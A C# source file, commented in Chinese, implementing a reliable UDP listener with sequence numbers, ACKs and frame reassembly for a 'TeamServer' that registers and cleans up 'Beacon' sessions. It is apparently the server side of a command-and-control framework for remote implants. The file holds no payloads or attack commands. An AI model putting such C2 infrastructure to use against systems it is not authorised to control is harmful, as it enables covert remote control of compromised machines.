using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using DataList.Client.Models;
using DataList.Beacon.Models;
using TeamServer.Beacon.Interface;
using TeamServer.Beacon.Models;
using TeamServer.HandlePacket;
using TeamServer.Data;

namespace TeamServer.Listener
{
	/// <summary>
	/// 可靠UDP（Stop-and-Wait ARQ），提供按端点的有序、去重、ACK机制以及可靠发送。
	/// 与现有TCP监听器解耦，可作为基础设施在需要的地方接入。
	/// </summary>
internal class UdpListenerSS : IListener
	{
		private readonly string _bindAddress;
		private readonly int _port;
		private UdpClient? _udp;
		private CancellationTokenSource? _cts;
		private Task? _recvTask;
		private Task? _cleanupTask;
		private readonly TimeSpan _cleanupInterval = TimeSpan.FromSeconds(30);
		private readonly TimeSpan _beaconIdleTimeout = TimeSpan.FromSeconds(60);

		// Stop-and-Wait 每端点状态
		private class EndpointState
		{
			public int ExpectedSequence; // 下一个期望的序号
		}

		private readonly ConcurrentDictionary<string, EndpointState> _states = new();

		// 报文头格式：
		// [1 byte flags][4 bytes seq(big-endian)][4 bytes length(big-endian)] [payload(length)]
		// flags: 0x01=DATA, 0x02=ACK
		private const byte FLAG_DATA = 0x01;
		private const byte FLAG_ACK = 0x02;
		private const int HEADER_SIZE = 1 + 4 + 4;
		private const int MAX_PAYLOAD = 1400; // 保守MTU以内

		public UdpListenerSS(string bindAddress, int port)
		{
			_bindAddress = bindAddress;
			_port = port;
		}

		public bool IsRunning { get; private set; }
		public string Protocol => "UDP";
		public string BindAddress => _bindAddress;
		public int Port => _port;

		/// <summary>
		/// 新Beacon连接事件
		public event Action<IBeaconSession>? OnBeaconConnected;
		/// Beacon断开连接事件
		public event Action<IBeaconSession>? OnBeaconDisconnected;
		/// UDP模式不处理Client，这里声明但不触发
		public event Action<ClientSession>? OnClientConnected;
		public event Action<ClientSession>? OnClientDisconnected;
		/// 错误事件
		public event Action<Exception>? OnError;

		public async Task StartAsync()
		{
			if (IsRunning) return;
			try
			{
				_udp = new UdpClient(new IPEndPoint(IPAddress.Parse(_bindAddress), _port));
				_udp.Client.ReceiveBufferSize = 1 << 20;
				_udp.Client.SendBufferSize = 1 << 20;
				_cts = new CancellationTokenSource();
				IsRunning = true;
				_recvTask = Task.Run(() => ReceiveLoop(_cts.Token));
				_cleanupTask = Task.Run(() => CleanupLoopAsync(_cts.Token));
				await Task.CompletedTask;
			}
			catch (Exception ex)
			{
				OnError?.Invoke(ex);
				throw;
			}
		}

		public async Task StopAsync()
		{
			if (!IsRunning) return;
			try
			{
				IsRunning = false;
				_cts?.Cancel();
				try { if (_recvTask != null) await _recvTask.ConfigureAwait(false); } catch { }
				try { if (_cleanupTask != null) await _cleanupTask.ConfigureAwait(false); } catch { }
				try { _udp?.Close(); } catch { }
			}
			catch (Exception ex)
			{
				OnError?.Invoke(ex);
				throw;
			}
		}

		private async Task ReceiveLoop(CancellationToken cancellationToken)
		{
			if (_udp == null) return;
			while (!cancellationToken.IsCancellationRequested)
			{
				try
				{
					var result = await _udp.ReceiveAsync(cancellationToken).ConfigureAwait(false);
					ProcessIncoming(result.RemoteEndPoint, result.Buffer);
				}
				catch (OperationCanceledException)
				{
					break;
				}
				catch (ObjectDisposedException)
				{
					break;
				}
				catch (Exception ex)
				{
					OnError?.Invoke(ex);
				}
			}
		}

		// endpoint -> session
		private readonly ConcurrentDictionary<string, BeaconUDPSession> _sessions = new();
		// endpoint -> accumulator for framed stream ([4-byte len BE] + payload)
		private readonly ConcurrentDictionary<string, byte[]> _accumulators = new();

		private void ProcessIncoming(IPEndPoint remote, byte[] datagram)
		{
			if (datagram.Length < HEADER_SIZE) return;
			var flags = datagram[0];
			int seq = ReadInt32BE(datagram, 1);
			int length = ReadInt32BE(datagram, 5);

			if ((flags & FLAG_ACK) == FLAG_ACK)
			{
				// 仅供 SendReliableAsync 等待；放到等待表中
				_ackWaiters.TryRemove(AckKey(remote, seq), out var tcs);
				tcs?.TrySetResult(true);
				return;
			}

			if ((flags & FLAG_DATA) != FLAG_DATA) return;
			if (length < 0 || length > MAX_PAYLOAD) return;
			if (datagram.Length < HEADER_SIZE + length) return;

			var key = remote.ToString();
			var state = _states.GetOrAdd(key, _ => new EndpointState { ExpectedSequence = 0 });

			if (seq == state.ExpectedSequence)
			{
				// 正常到达
				var payload = new byte[length];
				Buffer.BlockCopy(datagram, HEADER_SIZE, payload, 0, length);
				// 交付给对应会话（先进行帧重组）
				var session = _sessions.GetOrAdd(key, _ => CreateOrGetSession(remote));
				session.Info.LastSeenTime = DateTime.UtcNow;
				int preview = Math.Min(32, payload.Length);
				var hex = BitConverter.ToString(payload, 0, preview);

				var acc = _accumulators.GetOrAdd(key, _ => Array.Empty<byte>());
				// append
				if (acc.Length == 0)
				{
					acc = new byte[payload.Length];
					Buffer.BlockCopy(payload, 0, acc, 0, payload.Length);
				}
				else
				{
					var combined = new byte[acc.Length + payload.Length];
					Buffer.BlockCopy(acc, 0, combined, 0, acc.Length);
					Buffer.BlockCopy(payload, 0, combined, acc.Length, payload.Length);
					acc = combined;
				}
				// process frames: [4-byte len BE] + payload
				int offset = 0;
				while (true)
				{
					if (acc.Length - offset < 4) break;
					int frameLen = (acc[offset] << 24) | (acc[offset + 1] << 16) | (acc[offset + 2] << 8) | acc[offset + 3];
					if (frameLen <= 0 || frameLen > 16 * 1024 * 1024)
					{
						Console.WriteLine($"[UDP ERROR] 非法帧长度: {frameLen}, 丢弃累积");
						acc = Array.Empty<byte>();
						break;
					}
					if (acc.Length - offset - 4 < frameLen) break;

					var frame = new byte[frameLen];
					Buffer.BlockCopy(acc, offset + 4, frame, 0, frameLen);
					try { BeaconPacketHandle.Read(frame, session); }
					catch (Exception ex) 
					{
						Console.WriteLine($"[UDP ERROR] 解码帧异常: {ex.Message}");
					}
					offset += 4 + frameLen;
				}
				// keep tail
				if (offset == 0)
				{
					_accumulators[key] = acc;
				}
				else if (offset >= acc.Length)
				{
					_accumulators[key] = Array.Empty<byte>();
				}
				else
				{
					var remaining = acc.Length - offset;
					var tail = new byte[remaining];
					Buffer.BlockCopy(acc, offset, tail, 0, remaining);
					_accumulators[key] = tail;
				}
				state.ExpectedSequence = (state.ExpectedSequence + 1) & 0x7FFFFFFF;
				// ACK
				_ = SendAckAsync(remote, seq);
			}
			else
			{
				// 不是期望序号，重发最近ACK（简单策略：发对方报文序号的ACK）
				_ = SendAckAsync(remote, seq);
			}
		}

		private BeaconUDPSession CreateOrGetSession(IPEndPoint remote)
		{
			var info = new BeaconInfo
			{
				Id = Guid.NewGuid().ToString("N"),
				ListenerId = Protocol,
				IPProt = $"{remote.Address}:{remote.Port}",
				IPAddress = remote.Address.ToString(),
				ConnectedTime = DateTime.UtcNow,
				LastSeenTime = DateTime.UtcNow,
			};
			var session = new BeaconUDPSession(
				async (data) => await SendReliableAsync(remote, data).ConfigureAwait(false),
				() => { _sessions.TryRemove(remote.ToString(), out _); },
				info);

			session.OnClosed += s =>
			{
				_sessions.TryRemove(remote.ToString(), out _);
				OnBeaconDisconnected?.Invoke(s);
			};

			OnBeaconConnected?.Invoke(session);
			return session;
		}

		private async Task CleanupLoopAsync(CancellationToken cancellationToken)
		{
			while (!cancellationToken.IsCancellationRequested)
			{
				try
				{
					CleanupStaleBeacons();
				}
				catch (Exception ex)
				{
					OnError?.Invoke(ex);
				}

				try { await Task.Delay(_cleanupInterval, cancellationToken).ConfigureAwait(false); }
				catch (OperationCanceledException) { break; }
			}
		}

		private void CleanupStaleBeacons()
		{
			var now = DateTime.UtcNow;
			// 快照全局列表，避免枚举修改
			IBeaconSession[] snapshot;
			lock (BeaconList.Beacons)
			{
				snapshot = BeaconList.Beacons.ToArray();
			}

			foreach (var beacon in snapshot)
			{
				// 仅清理UDP会话
				if (!string.Equals(beacon.Info.ListenerId, this.Protocol, StringComparison.OrdinalIgnoreCase))
				{
					continue;
				}

				var id = beacon.Info.Id;
				var lastSeen = beacon.Info.LastSeenTime;
				var missingInActiveMap = !_sessions.ContainsKey(beacon.Info.IPProt); // 基于端点键
				var timedOut = (now - lastSeen) > _beaconIdleTimeout;

				if (missingInActiveMap || timedOut)
				{
					// 从全局列表移除
					lock (BeaconList.Beacons)
					{
						BeaconList.Beacons.RemoveAll(b => b.Info.Id == id);
					}
					// 发送断开通知
					try { BeaconPacketHandle.SendBeaconDisconnectedNotification(beacon); } catch { }
					// 移除本地会话映射
					_sessions.TryRemove(beacon.Info.IPProt, out _);
					_accumulators.TryRemove(beacon.Info.IPProt, out _);
					_states.TryRemove(beacon.Info.IPProt, out _);
					OnBeaconDisconnected?.Invoke(beacon);
					Console.WriteLine($"[-] [UDP] 清理Beacon: {beacon.Info.IPProt}, missing={missingInActiveMap}, timeout={timedOut}");
				}
			}
		}

		private async Task SendAckAsync(IPEndPoint remote, int seq)
		{
			if (_udp == null) return;
			var buf = new byte[HEADER_SIZE];
			buf[0] = FLAG_ACK;
			WriteInt32BE(buf, 1, seq);
			WriteInt32BE(buf, 5, 0);
			try { await _udp.SendAsync(buf, buf.Length, remote).ConfigureAwait(false); } catch { }
		}

		private static int ReadInt32BE(byte[] b, int offset)
		{
			return (b[offset] << 24) | (b[offset + 1] << 16) | (b[offset + 2] << 8) | b[offset + 3];
		}

		private static void WriteInt32BE(byte[] b, int offset, int value)
		{
			b[offset] = (byte)((value >> 24) & 0xFF);
			b[offset + 1] = (byte)((value >> 16) & 0xFF);
			b[offset + 2] = (byte)((value >> 8) & 0xFF);
			b[offset + 3] = (byte)(value & 0xFF);
		}

		// 可靠发送（Stop-and-Wait）：分片到 MAX_PAYLOAD，每片等待ACK并按序发送
		private readonly ConcurrentDictionary<string, TaskCompletionSource<bool>> _ackWaiters = new();

		public async Task SendReliableAsync(IPEndPoint remote, byte[] data, int timeoutMs = 2000, int maxRetries = 5)
		{
			if (_udp == null) throw new InvalidOperationException("UDP not started");

			int sequence = 0;
			int offset = 0;
			while (offset < data.Length)
			{
				int chunk = Math.Min(MAX_PAYLOAD, data.Length - offset);
				var packet = new byte[HEADER_SIZE + chunk];
				packet[0] = FLAG_DATA;
				WriteInt32BE(packet, 1, sequence);
				WriteInt32BE(packet, 5, chunk);
				Buffer.BlockCopy(data, offset, packet, HEADER_SIZE, chunk);

				int tries = 0;
				while (true)
				{
					tries++;
					var waiterKey = AckKey(remote, sequence);
					var tcs = new TaskCompletionSource<bool>(TaskCreationOptions.RunContinuationsAsynchronously);
					_ackWaiters[waiterKey] = tcs;
					try { await _udp.SendAsync(packet, packet.Length, remote).ConfigureAwait(false); } catch { }

					var completed = await Task.WhenAny(tcs.Task, Task.Delay(timeoutMs)).ConfigureAwait(false);
					if (completed == tcs.Task && tcs.Task.Result)
					{
						_ackWaiters.TryRemove(waiterKey, out _);
						break; // 下一片
					}

					if (tries >= maxRetries)
					{
						_ackWaiters.TryRemove(waiterKey, out _);
						throw new TimeoutException($"Reliable UDP send failed after {maxRetries} retries.");
					}
				}

				offset += chunk;
				sequence = (sequence + 1) & 0x7FFFFFFF;
			}
		}

		private static string AckKey(IPEndPoint ep, int seq) => $"{ep}-{seq}";

		// 使用独立文件中的 BeaconUDPSession
    }
}
